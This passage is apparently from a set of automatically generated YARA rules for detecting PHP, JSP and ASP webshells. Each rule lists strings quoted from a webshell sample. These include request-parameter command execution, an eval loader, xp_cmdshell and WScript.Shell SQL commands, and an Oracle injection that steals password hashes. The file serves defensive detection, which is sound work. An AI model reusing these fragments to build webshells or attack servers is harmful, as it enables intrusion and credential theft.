      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3f37210290d0bb6419182d5dcf65b7517b0198d67fa4a8f9e19471e54699ff53"
   strings:
      $x1 = "// cmd.php = Command Execution" fullword ascii
      $s2 = "  system($_GET['cmd']);" fullword ascii
      $s3 = "if($_GET['cmd']) {" fullword ascii
      $s4 = "<FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">" fullword ascii
      $s5 = "<INPUT TYPE=\"text\" NAME=\"cmd\">" fullword ascii
      $s6 = "// by: The Dark Raver" fullword ascii
      $s7 = "<INPUT TYPE=\"submit\" VALUE=\"Send\">" fullword ascii
      $s8 = "// modified: 21/01/2004" fullword ascii
      $s9 = "<HTML><BODY>" fullword ascii /* Goodware String - occured 3 times */
      $s10 = "// PHP_KIT" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule webshell_php_up {
   meta:
      description = "webshell - file up.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f3b7d05872da61d5a9d5db39462383a74a53d8e1115458cb7f553d590ed3233a"
   strings:
      $s1 = "if(is_uploaded_file($HTTP_POST_FILES['userfile']['tmp_name'])) {" fullword ascii
      $s2 = "   copy($HTTP_POST_FILES['userfile']['tmp_name'], $_POST['remotefile']);" fullword ascii
      $s3 = "   echo \"Uploaded file: \" . $HTTP_POST_FILES['userfile']['name'];" fullword ascii
      $s4 = "// by: The Dark Raver" fullword ascii
      $s5 = "<form enctype=\"multipart/form-data\" action=\"\" method=\"post\">" fullword ascii
      $s6 = "// up.php = File Upload" fullword ascii
      $s7 = "<p>Remote File: <input name=\"remotefile\" type=\"text\">" fullword ascii
      $s8 = "<p>Local File: <input name=\"userfile\" type=\"file\">" fullword ascii
      $s9 = "// modified: 21/01/2004" fullword ascii
      $s10 = "<input type=\"submit\" value=\"Send\">" fullword ascii
      $s11 = "<html><body>" fullword ascii /* Goodware String - occured 1 times */
      $s12 = "</html></body>" fullword ascii
      $s13 = "</form><br><br><br>" fullword ascii
      $s14 = "<input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"1000000\">" fullword ascii
      $s15 = "// PHP_KIT" fullword ascii
      $s16 = "   echo \"No File Uploaded\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}

rule cmd_win32 {
   meta:
      description = "webshell - file cmd_win32.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a577587bd71c3928ba7902f147a18ab647e1478e0559ec1f213fcbf6c227b991"
   strings:
      $x1 = "        Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParameter(\"cmd\"));" fullword ascii
      $x2 = "// cmd.jsp = Command Execution (win32)" fullword ascii
      $s3 = "if (request.getParameter(\"cmd\") != null) {" fullword ascii
      $s4 = "        out.println(\"Command: \" + request.getParameter(\"cmd\") + \"\\n<BR>\");" fullword ascii
      $s5 = "<%@ page import=\"java.util.*,java.io.*,java.net.*\"%>" fullword ascii
      $s6 = "<INPUT TYPE=\"text\" NAME=\"cmd\">" fullword ascii
      $s7 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword ascii
      $s8 = "<INPUT TYPE=\"submit\" VALUE=\"Send\">" fullword ascii
      $s9 = "        OutputStream os = p.getOutputStream();" fullword ascii
      $s10 = "// modified: 27/06/2003" fullword ascii
      $s11 = "// by: Unknown" fullword ascii
      $s12 = "        InputStream in = p.getInputStream();" fullword ascii
      $s13 = "<HTML><BODY>" fullword ascii /* Goodware String - occured 3 times */
      $s14 = "                out.println(disr); disr = dis.readLine(); }" fullword ascii
      $s15 = "        String disr = dis.readLine();" fullword ascii
      $s16 = "// JSP_KIT" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 2KB and
      1 of ($x*) and 4 of them
}

rule webshell_jsp_102 {
   meta:
      description = "webshell - file 102.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e0539a2d4e132884adc135c8438f7647ddd6be61f1f9d83966b12f17382a1296"
   strings:
      $x1 = "        Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParameter(\"cmd\"));" fullword ascii
      $x2 = "// cmd.jsp = Command Execution (win32)" fullword ascii
      $s3 = "if (request.getParameter(\"cmd\") != null) {" fullword ascii
      $s4 = "        out.println(\"Command: \" + request.getParameter(\"cmd\") + \"\\n<BR>\");" fullword ascii
      $s5 = "<%@ page import=\"java.util.*,java.io.*,java.net.*\"%>" fullword ascii
      $s6 = "<INPUT TYPE=\"text\" NAME=\"cmd\">" fullword ascii
      $s7 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword ascii
      $s8 = "<INPUT TYPE=\"submit\" VALUE=\"Send\">" fullword ascii
      $s9 = "        OutputStream os = p.getOutputStream();" fullword ascii
      $s10 = "// modified: 27/06/2003" fullword ascii
      $s11 = "// by: Unknown" fullword ascii
      $s12 = "        InputStream in = p.getInputStream();" fullword ascii
      $s13 = "<HTML><BODY>" fullword ascii /* Goodware String - occured 3 times */
      $s14 = "                out.println(disr); disr = dis.readLine(); }" fullword ascii
      $s15 = "        String disr = dis.readLine();" fullword ascii
      $s16 = "// JSP_KIT" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 2KB and
      1 of ($x*) and 4 of them
}

rule webshell_jsp_cmd {
   meta:
      description = "webshell - file cmd.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "0515cd2ba84a5da10c63cadae06f04d778d66c054b9184edb57be6ea95a1095b"
   strings:
      $x1 = "// cmd.jsp = Command Execution (unix)" fullword ascii
      $s2 = "        Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));" fullword ascii
      $s3 = "if (request.getParameter(\"cmd\") != null) {" fullword ascii
      $s4 = "        out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");" fullword ascii
      $s5 = "<FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">" fullword ascii
      $s6 = "<INPUT TYPE=\"text\" NAME=\"cmd\">" fullword ascii
      $s7 = "<%@ page import=\"java.util.*,java.io.*\"%>" fullword ascii
      $s8 = "<INPUT TYPE=\"submit\" VALUE=\"Send\">" fullword ascii
      $s9 = "        OutputStream os = p.getOutputStream();" fullword ascii
      $s10 = "// modified: 27/06/2003" fullword ascii
      $s11 = "// by: Unknown" fullword ascii
      $s12 = "        InputStream in = p.getInputStream();" fullword ascii
      $s13 = "<HTML><BODY>" fullword ascii /* Goodware String - occured 3 times */
      $s14 = "        String disr = dis.readLine();" fullword ascii
      $s15 = "                disr = dis.readLine(); " fullword ascii
      $s16 = "// JSP_KIT" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 2KB and
      1 of ($x*) and 4 of them
}

rule webshell_jsp_list {
   meta:
      description = "webshell - file list.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "580c4815db65a2b1ae851156dcb7607d274f5feadf3903a7a348aaea6190027c"
   strings:
      $s1 = "out.print(\") <A Style='Color: \" + fcolor.toString() + \";' HRef='?file=\" + fname.toString() + \"'>\" + fname.toString() + \"<" ascii
      $s2 = "out.print(\"<B>Path: <U>\" + f.toString() + \"</U></B><BR> <BR>\");" fullword ascii
      $s3 = "out.print(\") <A Style='Color: \" + fcolor.toString() + \";' HRef='?file=\" + fname.toString() + \"'>\" + fname.toString() + \"<" ascii
      $s4 = "File f = new File(request.getParameter(\"file\"));" fullword ascii
      $s5 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword ascii
      $s6 = "if(request.getParameter(\"file\")==null) {" fullword ascii
      $s7 = "ServletOutputStream outs = response.getOutputStream();" fullword ascii
      $s8 = " \"( Size: \" + flist[i].length() + \" bytes)<BR>\\n\");" fullword ascii
      $s9 = "fname = fname + \"/\";" fullword ascii
      $s10 = "outs.flush();" fullword ascii
      $s11 = "<%@ page import=\"java.util.*,java.io.*\"%>" fullword ascii
      $s12 = "outs.write(left);" fullword ascii
      $s13 = "out.print(\"(\");" fullword ascii
      $s14 = "out.print(\"-\");" fullword ascii
      $s15 = "out.print(\"?\");" fullword ascii
      $s16 = "left = in.read(); " fullword ascii
      $s17 = "out.print(\"d\");" fullword ascii
      $s18 = "<% //read the file name." fullword ascii
      $s19 = "// list.jsp = Directory & File View" fullword ascii
      $s20 = "out.print(\"Can't Read file<BR>\");" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 5KB and
      8 of them
}

rule webshell_php_php1 {
   meta:
      description = "webshell - file php1.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2b28499fc5ed0f8420ce310ffe32858a5b439ec079203b55e0de10b99e68274f"
   strings:
      $s1 = "$myurl='http://www.zjjv.com';//" fullword ascii
      $s2 = "$password='admin';//" fullword ascii
      $s3 = "wIui+t/gBcsvHkJCFZcEQxxlRSugfVjXA/hIzkRjFRLogykm2S" fullword ascii
      $s4 = "oMM5VHOcvAi+ndbMaMqmfGEtsEXIgT7lrzsB1w4jQFfUHzZ65A" fullword ascii
      $s5 = "0A5kXzBtazYaHXtkUgEtigSd1KbR00grmOksD1vRTL2g8sw3d8" fullword ascii
      $s6 = "4NCJOhINHlxJp8Md5iWwGZPCYDlgGBuUJN6bDNhnsADlLve8Iq" fullword ascii
      $s7 = "bu2JKD2QLRAR9aHrN30RGaGTNih34JBlPDAfVnLlOGMXA3tpNU" fullword ascii
      $s8 = "RvL60vXjRv6pjwLzGPfe/LbsOcvl3fbNi92bSxv5Ztg8dLl5Kd" fullword ascii
      $s9 = "V8wjiGcpu0JkBzps8H80MZDk8U5lkLdsx9JghqWvdjusPyJAi6" fullword ascii
      $s10 = "4FMGIYk6p4Vbyu9+wAfTPpb+dfaQ79Hvwe/g4aPaCO/oj4mLL5" fullword ascii
      $s11 = "3Ve+sKNHLuFtP/zpe//hhf/5u78oz+WUKhZyE3elrl4bY70xuT" fullword ascii
      $s12 = "QaOkHSwetBfjpSHLfdrSwGrITkAl4NeAYWB5ANEYeQOMCsMK1Q" fullword ascii
      $s13 = "$shellname='" fullword ascii
      $s14 = "OpqdXVfCBZfjRPdni1iYFZOX/xBHlogZFnrjYJyhpjWvrkoKnc" fullword ascii
      $s15 = "UboxPDOorYVW2cWJvNBeSY9/jKvyRZiy2Fj3DqDyhZJe1DfVRG" fullword ascii
      $s16 = "kEyQQIaCKTh4GfBa17bQLDFdpkPLcTDT0NsxeKGThRnWpUkmCU" fullword ascii
      $s17 = "bbpc4BGEWQrRBgnk+FEauyH0b1nvnoF1b+tport2aIApeA4++U" fullword ascii
      $s18 = "QgY0RkcMd3e3Bsc7cFVP2SlXMYFFrTzJfWlzya1a1x3hfL12iu" fullword ascii
      $s19 = "4CsAJ+jcHSQq4Wg2kpbfC2kEyXjgyQai5TMmLIxcNPgno8oHBb" fullword ascii
      $s20 = "rFEOVkarrI8w8POkqzzMtMpu/0LXZS9EruVfJMFKqj+I7GmGsG" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule sig_20220213_06 {
   meta:
      description = "webshell - file 20220213_06.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "94ccd59fdc4ca9ed96f4a2851e6fcac45ac40b7966dd1830d21d579de449e93c"
   strings:
      $s1 = "$post=file_get_contents(\"php://input\");" fullword ascii
      $s2 = "$_SESSION['k']=$key;" fullword ascii
      $s3 = "@error_reporting(0);" fullword ascii
      $s4 = "$datas=explode(\"\\n\",$post);" fullword ascii
      $s5 = "if(isset($post))" fullword ascii
      $s6 = "$code[$i] = $code[$i]^$key[$i+1&15]; " fullword ascii
      $s7 = "$t=\"base64_\".\"decode\";" fullword ascii
      $s8 = "$code=$t($code.\"\");" fullword ascii
      $s9 = "$code=$datas[0];" fullword ascii
      $s10 = "$key=\"900bc885d7553375\";" fullword ascii
      $s11 = "for($i=0;$i<strlen($code);$i++) {" fullword ascii
      $s12 = "class C{public function __construct($p) {eval($p.\"\");}}" fullword ascii
      $s13 = "bc885d7553375" ascii
      $s14 = "@new C($p);" fullword ascii
      $s15 = "$p=$arr[1];" fullword ascii
      $s16 = "900bc885d7553375" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}

rule webshell_jsp_system {
   meta:
      description = "webshell - file system.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c142d327f84c86160f6775009ff016baf45d1a77de4747dd8ca35bd9b36954be"
   strings:
      $x1 = "list = getSqlExecuteContext(str, url, user, password);" fullword ascii
      $s2 = "public List getSqlExecuteContext(String sql, String url, String user," fullword ascii
      $s3 = "+ executeUpdate(str, url, user, password) + \" tiao !\");" fullword ascii
      $s4 = "sqlstr+=\"EXEC XDB.XDB_PITRIG_PKG.PITRIG_DROP('SCOTT\\\".\\\"SH2KERR\\\" WHERE 1=SCOTT.CHANGEPASS()--','HELLO IDS IT IS EXPLOIT " ascii
      $s5 = "public Connection getConn(String url, String user, String password)" fullword ascii
      $s6 = "return DriverManager.getConnection(url, user, password);" fullword ascii
      $s7 = "Connection conn = DriverManager.getConnection(url, user, password);" fullword ascii
      $s8 = "sqlstr+=\"EXECUTE IMMEDIATE 'INSERT INTO SCOTT.sh2kerr(id,name,password) SELECT user_id,username,password FROM DBA_USERS';\"+\"" ascii
      $s9 = "sqlstr+=\"Oracle 10g R1 xdb.xdb_pitrig_pkg PLSQL Injection (change sys password)\"+\"\\r\\n\";" fullword ascii
      $s10 = "sqlstr+=\"EXECUTE IMMEDIATE 'INSERT INTO SCOTT.sh2kerr(id,name,password) SELECT user_id,username,password FROM DBA_USERS';\"+\"" ascii
      $s11 = "sqlstr+=\"EXECUTE IMMEDIATE 'update sys.user$ set password=''EC7637CC2C2BOADC'' where name=''SYSTEM''';\"+\"\\r\\n\";" fullword ascii
      $s12 = "Connection conn = getConn(url, user, password);" fullword ascii
      $s13 = ".getParameter(\"oracle_config_db_password\");" fullword ascii
      $s14 = ".getParameter(\"oracle_config_db_password1\");" fullword ascii
      $s15 = "sqlstr+=\"EXEC XDB.XDB_PITRIG_PKG.PITRIG_TRUNCATE('SCOTT&quot;.&quot;SH2KERR&quot; WHERE 1=SCOTT.SHOWPASS()--','HELLO IDS IT IS " ascii
      $s16 = "public int executeUpdate(String sql, String url, String user," fullword ascii
      $s17 = "request.getSession().setAttribute(\"db_password\"," fullword ascii
      $s18 = "listRsValue.add(rs.getObject(i + 1));" fullword ascii
      $s19 = "String strResponse =\"<b>execute :\\\"\" + strsql + \"\\\"</b><table border=1>\";" fullword ascii
      $s20 = "url = \"jdbc:oracle:thin:@(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(HOST=\"" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule Inderxer {
   meta:
      description = "webshell - file Inderxer.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "0dcbd6cce79f768d9e9b79bc8c86be279779120b8232e32c1f3198ee56653518"
   strings:
      $s1 = "m Bilgileri </a>- <a href=\"javascript:void(0);\" onclick=\"javascript:Start ('?copy');\">Copright</a> -<a href=\"javascript:voi" ascii
      $s2 = "nda </a> - <a href=\"javascript:void(0);\" onclick=\"javascript:Start ('?kullanim');\">Kullan" fullword ascii
      $s3 = "m Bilgileri </a>- <a href=\"javascript:void(0);\" onclick=\"javascript:Start ('?copy');\">Copright</a> -<a href=\"javascript:voi" ascii
      $s4 = "<title>WwW.SaNaLTeRoR.OrG - inDEXER And ReaDer</title>" fullword ascii
      $s5 = "nDexEr - Reader\"" fullword ascii
      $s6 = "var tempref=document.all.typinglight" fullword ascii
      $s7 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword ascii
      $s8 = "var message=\"SaNaLTeRoR - " fullword ascii
      $s9 = "document.write('<span id=\"typinglight\">'+message.charAt(m)+'</span>')" fullword ascii
      $s10 = "'+@*@!Vk@*ASh /m8KYCT+ Y+m:cGDTPSPShA kl\\kC3cmWs~SPShSRhkUr" fullword ascii
      $s11 = "tempref[m].style.color=typingbasecolor" fullword ascii
      $s12 = "if (n<tempref.length-1)" fullword ascii
      $s13 = "tempref[n].style.color=typingtextcolor" fullword ascii
      $s14 = "<%@ LANGUAGE = VBScript.Encode %>" fullword ascii
      $s15 = "Script Hakk" fullword ascii
      $s16 = "\" onclick=\"javascript:Start ('?linkler');\"> Linkler</a>" fullword ascii
      $s17 = "<script language=\"JavaScript1.2\">" fullword ascii
      $s18 = "<a href=\"javascript:void(0);\" onclick=\"javascript:Start ('?hakkinda');\">" fullword ascii
      $s19 = "<form action=\"?Gonder\" method=\"post\">" fullword ascii
      $s20 = "<form action=\"?oku\" method=\"post\">" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 30KB and
      8 of them
}

rule NEW_WebShell__1_ {
   meta:
      description = "webshell - file NEW WebShell (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
   strings:
      $s1 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Server.Exec\"&\"ute</td><td><font color=red>" fullword ascii
      $s2 = "rrs\"<center><div style='width:60%;padding:1px;'><a href=\"&siteurl&\" target=_blank>\"&loginad&\"</a><br><a href='javascript:hi" ascii
      $s3 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\cmd.exe\")&\"' size='40'>\"" fullword ascii
      $s4 = "rrs\"<center><div style='width:60%;padding:1px;'><a href=\"&siteurl&\" target=_blank>\"&loginad&\"</a><br><a href='javascript:hi" ascii
      $s5 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\\\\\"\")'>Documents</a>" fullword ascii
      $s6 = "Set Matches = regEx.Execute(filetxt)" fullword ascii
      $s7 = "Set XMatches = XregEx.Execute(filetxt)" fullword ascii
      $s8 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Exec\"&\"ute</td><td><font color=red>e\"&\"xecute()" fullword ascii
      $s9 = "</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=Cmd1Shell' target='FileFrame'><b>->" fullword ascii
      $s10 = "connstr=\"Provider=SQLOLEDB.1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\"" fullword ascii
      $s11 = "temp = \"<a href=\"\"http://\"&Request.Servervariables(\"server_name\")&\"/\"&tURLEncode(replace(replace(FilePath,server.MapPath" ascii
      $s12 = "temp = \"<a href=\"\"http://\"&Request.Servervariables(\"server_name\")&\"/\"&tURLEncode(replace(replace(FilePath,server.MapPath" ascii
      $s13 = "temp = \"<a href=\"\"http://\"&Request.Servervariables(\"server_name\")&\"/\"&tURLEncode(Replace(replace(thePath,server.MapPath(" ascii
      $s14 = "tpircsw" fullword ascii /* reversed goodware string 'wscript' */
      $s15 = "<a href='javascript:ShowFolder(\"\"D:\\\\RECYCLER\\\\\"\")'>D:\\RECYCLER</a>" fullword ascii
      $s16 = "    Conn.Execute(SqlStr)" fullword ascii
      $s17 = "<a href='javascript:ShowFolder(\"\"C:\\\\RECYCLER\\\\\"\")'>C:\\\\RECYCLER</a>" fullword ascii
      $s18 = "</b></a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=hiddenshell' target='FileFrame'><b>->" fullword ascii
      $s19 = "raelC.rrE" fullword ascii /* reversed goodware string 'Err.Clear' */
      $s20 = "raelc.rre" fullword ascii /* reversed goodware string 'err.clear' */
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      8 of them
}

rule UnKnown_Vip__1_ {
   meta:
      description = "webshell - file UnKnown Vip (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
   strings:
      $x1 = "Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provider=SQLOLED" ascii
      $x2 = "ODE','REG_DWORD',1;SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD.E" ascii
      $x3 = "if ShellPath=\"\" Then ShellPath = \"cmd.exe\"" fullword ascii
      $s4 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Server.Exec\"&\"ute</td><td><font color=red>" fullword ascii
      $s5 = "       STRQUERY = \"SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD." ascii
      $s6 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
      $s7 = "       STRQUERY = \"DROP TABLE [JNC];EXEC MASTER..XP_REGWRITE 'HKEY_LOCAL_MACHINE','SOFTWARE\\MICROSOFT\\JET\\4.0\\ENGINES','SAN" ascii
      $s8 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\cmd.exe\")&\"' size='40'>\"" fullword ascii
      $s9 = "@O OUT EXEC SP_OAMETHOD @O,'RUN',NULL,'CMD /C \"&REQUEST(\"CMD\")&\" > 8617.TMP',0,TRUE;BULK INSERT [JNC] FROM '8617.TMP' WITH (" ascii
      $s10 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\\\\\"\")'>Documents</a>" fullword ascii
      $s11 = "SI=SI&\"<form method=post action='http://www.ip138.com/ips.asp' name='ipform' target='_blank'><tr align='center'><td height='20'" ascii
      $s12 = "SI=SI&\"<form method=post action='http://www.ip138.com/ips.asp' name='ipform' target='_blank'><tr align='center'><td height='20'" ascii
      $s13 = "Set Matches = regEx.Execute(filetxt)" fullword ascii
      $s14 = "Set XMatches = XregEx.Execute(filetxt)" fullword ascii
      $s15 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Exec\"&\"ute</td><td><font color=red>e\"&\"xecute()" fullword ascii
      $s16 = "       STRQUERY = \"SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD." ascii
      $s17 = "       STRQUERY = \"CREATE TABLE [JNC](RESULTTXT NVARCHAR(1024) NULL);USE MASTER DECLARE @O INT EXEC SP_OACREATE 'WSCRIPT.SHELL'" ascii
      $s18 = "       STRQUERY = \"DROP TABLE [JNC];DECLARE @O INT EXEC SP_OACREATE 'WSCRIPT.SHELL',@O OUT EXEC SP_OAMETHOD @O,'RUN',NULL,'CMD " ascii
      $s19 = "Set WFSO = Nothing:End Sub:case\"hiddenshell\":hiddenshell():case \"SetFileText\":SetFileText():Case \"ReadREG\":call ReadREG():" ascii
      $s20 = ";Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\":conn.ConnectionTimeout=1:conn.open connstr:If Err Then" ascii
   condition:
      uint16(0) == 0x253c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule UnKnown_Vip {
   meta:
      description = "webshell - file UnKnown Vip.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
   strings:
      $x1 = "Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provider=SQLOLED" ascii
      $x2 = "ODE','REG_DWORD',1;SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD.E" ascii
      $x3 = "if ShellPath=\"\" Then ShellPath = \"cmd.exe\"" fullword ascii
      $s4 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Server.Exec\"&\"ute</td><td><font color=red>" fullword ascii
      $s5 = "       STRQUERY = \"SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD." ascii
      $s6 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
      $s7 = "       STRQUERY = \"DROP TABLE [JNC];EXEC MASTER..XP_REGWRITE 'HKEY_LOCAL_MACHINE','SOFTWARE\\MICROSOFT\\JET\\4.0\\ENGINES','SAN" ascii
      $s8 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\cmd.exe\")&\"' size='40'>\"" fullword ascii
      $s9 = "@O OUT EXEC SP_OAMETHOD @O,'RUN',NULL,'CMD /C \"&REQUEST(\"CMD\")&\" > 8617.TMP',0,TRUE;BULK INSERT [JNC] FROM '8617.TMP' WITH (" ascii
      $s10 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\\\\\"\")'>Documents</a>" fullword ascii
      $s11 = "SI=SI&\"<form method=post action='http://www.ip138.com/ips.asp' name='ipform' target='_blank'><tr align='center'><td height='20'" ascii
      $s12 = "SI=SI&\"<form method=post action='http://www.ip138.com/ips.asp' name='ipform' target='_blank'><tr align='center'><td height='20'" ascii
      $s13 = "Set Matches = regEx.Execute(filetxt)" fullword ascii
      $s14 = "Set XMatches = XregEx.Execute(filetxt)" fullword ascii
      $s15 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Exec\"&\"ute</td><td><font color=red>e\"&\"xecute()" fullword ascii
      $s16 = "       STRQUERY = \"SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD." ascii
      $s17 = "       STRQUERY = \"CREATE TABLE [JNC](RESULTTXT NVARCHAR(1024) NULL);USE MASTER DECLARE @O INT EXEC SP_OACREATE 'WSCRIPT.SHELL'" ascii
      $s18 = "       STRQUERY = \"DROP TABLE [JNC];DECLARE @O INT EXEC SP_OACREATE 'WSCRIPT.SHELL',@O OUT EXEC SP_OAMETHOD @O,'RUN',NULL,'CMD " ascii
      $s19 = "Set WFSO = Nothing:End Sub:case\"hiddenshell\":hiddenshell():case \"SetFileText\":SetFileText():Case \"ReadREG\":call ReadREG():" ascii
      $s20 = ";Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\":conn.ConnectionTimeout=1:conn.open connstr:If Err Then" ascii
   condition:
      uint16(0) == 0x253c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule webshell_asp_indexx {
   meta:
      description = "webshell - file indexx.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a828153a8ec75ebeec010bd9e0fa5873b9c2602c0caa393a115075a16d74d0ab"
   strings:
      $x1 = "Const strs_toTransform=\"command|Radmin|NTAuThenabled|FilterIp|IISSample|PageCounter|PermissionChecker|BrowserType|ContentRotato" ascii
      $x2 = "conn.execute(\"exec master..xp_cmdshell'bcp \"\"select binfile from \"&dbname&\"..dark_temp\"\" queryout \"\"\"&thePath&\"\"\" -" ascii
      $x3 = "conn.execute(\"exec master..xp_cmdshell'bcp \"\"\"&dbname&\"..dark_temp\"\" in \"\"\"&loadpath&\"\"\" -T -f c:\\tmp.fmt'\")" fullword ascii
      $x4 = "conn.execute(\"exec master..xp_cmdshell'bcp \"\"select binfile from \"&dbname&\"..dark_temp\"\" queryout \"\"\"&thePath&\"\"\" -" ascii
      $x5 = "conn.Execute(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED,strPath VarChar,binContent Image)\")" fullword ascii
      $x6 = "form2.queryStr.value=\"alter database \"&dbname&\" Set recovery full;dump transaction \"&dbname&\" with no_log;If object_id('dar" ascii
      $x7 = "Dim goaction,thePath,cmdStr,connStr,regPath,pubPam,serverName,objXml,objWs,objFso,objSa,objStream,objRe,pagePath,pageName,startT" ascii
      $x8 = "If getInc=1 Then strInclude=regExecute(content,\"<!--\\s*#include\\s+(file|virtual)\\s*=\\s*.*-->\",False)(0)" fullword ascii
      $x9 = "If regPaths=\"\"Then regPaths=Replace(\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName\\ComputerName|HKLM" ascii
      $x10 = "doTdInput\"text\",\"fsoori\",\"C:\\WINDOWS\\system32\\cmd.exe\",\"35%\",\"\",\"\"" fullword ascii
      $x11 = "doTdInput\"text\",\"rwpath\",\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options" ascii
      $x12 = "8AFB8|Server.Execute|Eval|localgroup|MaxUsersLoginPerIP|Server.Execute|ShellExecute|Terminal|Unauthorized|DarkBladePass|AuThenti" ascii
      $x13 = "conn.execute \"CREATE TABLE [dark_temp] ([id] [int] NULL ,[binfile] [Image] NULL) ON [PRIMARY] TEXTIMAGE_ON [PRIMARY];\"" fullword ascii
      $x14 = "conn.execute \"If object_id('dark_temp')is not null drop table dark_temp\"" fullword ascii
      $x15 = "conn.execute \"CREATE TABLE [dark_temp] ([binfile] [Image] NULL)\"" fullword ascii
